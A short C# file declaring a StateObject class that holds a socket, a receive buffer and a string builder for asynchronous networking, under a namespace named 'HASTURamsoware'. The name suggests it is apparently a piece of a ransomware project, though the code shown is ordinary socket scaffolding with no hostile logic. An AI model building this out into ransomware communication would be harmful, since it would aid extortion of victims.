using System.Net.Sockets;
using System.Text;

namespace HASTURamsoware;

public class StateObject
{
	public Socket workSocket = null;

	public const int BufferSize = 256;

	public byte[] buffer = new byte[256];

	public StringBuilder sb = new StringBuilder();
}
